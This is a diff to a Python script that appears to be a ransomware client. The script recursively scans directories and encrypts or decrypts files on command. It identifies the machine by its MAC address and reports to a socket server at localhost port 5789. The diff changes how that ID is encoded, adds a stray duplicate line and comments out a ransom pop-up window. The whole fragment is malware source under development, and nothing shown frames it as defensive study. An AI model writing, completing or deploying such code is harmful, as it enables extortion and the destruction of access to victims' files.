@@ -7,7 +7,7 @@ import sys
 from threading import *
 import uuid
 
-import interface
+#import interface
 
 def recursiveScan(baseDir):
     # scan current directory
@@ -70,7 +70,8 @@ def decryptFiles(key):
             decrypt(filePath, key)
 
 # way to ID
-MESSAGE = uuid.getnode().to_bytes(48, 'big')
+MESSAGE = hex(uuid.getnode())
+hex(uuid.getnode())
 
 HOST = 'localhost'
 PORT = 5789
@@ -79,7 +80,7 @@ BUFFER_SIZE = 1024
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 print('Connected!')
-s.send(MESSAGE)
+s.send(bytes(MESSAGE, "utf-8"))
 
 while True:
 
@@ -101,9 +102,9 @@ while True:
                     encryptFiles(key)
                 
 
-                t1 = Thread(target=interface.App().pop_up_win)
-                t1.daemon = True
-                t1.start()
+                #t1 = Thread(target=interface.App().pop_up_win)
+               # t1.daemon = True
+                #t1.start()
 
                 # wait for a signal to begin decryption
                 print('Thread worked!!!')
